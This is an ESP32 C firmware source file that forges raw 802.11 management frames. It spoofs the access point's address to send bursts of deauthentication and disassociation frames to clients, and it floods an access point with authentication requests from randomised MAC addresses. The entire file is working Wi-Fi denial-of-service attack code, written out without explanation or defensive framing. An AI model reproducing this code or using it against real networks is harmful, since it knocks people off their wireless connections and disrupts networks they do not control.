#include "frames.h"

#include <string.h>
#include <stdlib.h>

#include "esp_wifi.h"
#include "esp_random.h"

const uint8_t MAC_BROADCAST[MAC_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

#define FRAMES_PER_BURST 10

typedef struct __attribute__((packed)) {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t bssid[6];
    uint8_t seq[2];
    uint8_t reason[2];
} mgmt_reasoned_frame_t;  /* deauth (0xC0) and disassoc (0xA0) share this */

typedef struct __attribute__((packed)) {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t bssid[6];
    uint8_t seq[2];
    uint8_t auth_alg[2];
    uint8_t auth_seq[2];
    uint8_t status[2];
} auth_frame_t;

static uint16_t s_seq = 0;

static inline uint16_t next_seq(void)
{
    s_seq = (s_seq + 1) & 0x0FFF;
    return s_seq;
}

static void send_reasoned(uint8_t subtype, const uint8_t *da, const uint8_t *bssid, uint16_t reason)
{
    mgmt_reasoned_frame_t f;
    f.frame_ctrl[0] = subtype;
    f.frame_ctrl[1] = 0x00;
    f.duration[0]   = 0x00;
    f.duration[1]   = 0x00;
    memcpy(f.da, da, 6);
    memcpy(f.sa, bssid, 6);
    memcpy(f.bssid, bssid, 6);
    uint16_t seq = next_seq() << 4;
    f.seq[0] = seq & 0xFF;
    f.seq[1] = (seq >> 8) & 0xFF;
    f.reason[0] = reason & 0xFF;
    f.reason[1] = (reason >> 8) & 0xFF;
    esp_wifi_80211_tx(WIFI_IF_STA, &f, sizeof(f), false);
}

void frames_send_deauth(const uint8_t *da, const uint8_t *bssid, uint16_t reason)
{
    send_reasoned(0xC0, da, bssid, reason);
}

void frames_send_disassoc(const uint8_t *da, const uint8_t *bssid, uint16_t reason)
{
    send_reasoned(0xA0, da, bssid, reason);
}

void frames_send_auth_flood(const uint8_t *bssid)
{
    auth_frame_t f;
    f.frame_ctrl[0] = 0xB0;
    f.frame_ctrl[1] = 0x00;
    f.duration[0]   = 0x00;
    f.duration[1]   = 0x00;
    memcpy(f.da, bssid, 6);
    /* Random SA — the LSB of the first byte is cleared so it's a unicast,
     * locally-administered MAC (bit 1 set, bit 0 clear). */
    for (int i = 0; i < 6; i++) {
        f.sa[i] = (uint8_t)(esp_random() & 0xFF);
    }
    f.sa[0] = (f.sa[0] & 0xFC) | 0x02;
    memcpy(f.bssid, bssid, 6);
    uint16_t seq = next_seq() << 4;
    f.seq[0] = seq & 0xFF;
    f.seq[1] = (seq >> 8) & 0xFF;
    f.auth_alg[0] = 0x00;  /* open system */
    f.auth_alg[1] = 0x00;
    f.auth_seq[0] = 0x01;  /* request */
    f.auth_seq[1] = 0x00;
    f.status[0]   = 0x00;
    f.status[1]   = 0x00;
    esp_wifi_80211_tx(WIFI_IF_STA, &f, sizeof(f), false);
}

static const uint16_t REASONS[] = {0x0001, 0x0003, 0x0006, 0x0007, 0x0008};

static uint32_t burst_reasoned(uint8_t subtype, uint8_t channel, const uint8_t *da, const uint8_t *bssid)
{
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < FRAMES_PER_BURST; i++) {
        send_reasoned(subtype, da, bssid, REASONS[i % (sizeof(REASONS) / sizeof(REASONS[0]))]);
    }
    return FRAMES_PER_BURST;
}

uint32_t frames_burst_deauth(uint8_t channel, const uint8_t *da, const uint8_t *bssid)
{
    return burst_reasoned(0xC0, channel, da, bssid);
}

uint32_t frames_burst_disassoc(uint8_t channel, const uint8_t *da, const uint8_t *bssid)
{
    return burst_reasoned(0xA0, channel, da, bssid);
}

uint32_t frames_burst_auth_flood(uint8_t channel, const uint8_t *bssid)
{
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < FRAMES_PER_BURST; i++) {
        frames_send_auth_flood(bssid);
    }
    return FRAMES_PER_BURST;
}
